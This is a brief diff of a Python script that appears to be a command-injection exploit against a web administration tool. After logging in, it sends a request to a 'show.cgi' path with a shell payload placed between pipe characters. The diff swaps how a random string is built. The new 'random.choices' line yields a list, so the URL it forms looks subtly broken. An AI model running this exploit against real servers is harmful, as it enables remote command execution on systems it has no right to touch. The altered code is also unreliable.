@@ -32,7 +32,7 @@ except: sid = None
 if resp.status_code == 302 and sid: print('\nAuthentication successful!!!\n')
 else: exit('\nAuthentication Failed!!!\n')
 
-alphanums = ''.join([random.choice(string.ascii_letters + string.digits) for i in range(5)])
+alphanums = random.choices(string.ascii_letters + string.digits, k = 5)
 url = f'http://{target}/file/show.cgi/bin/{alphanums}|{payload}|'
 print('Executing the payload...')
 resp = requests.get(url, cookies={'sid': sid},verify=False, allow_redirects=False)
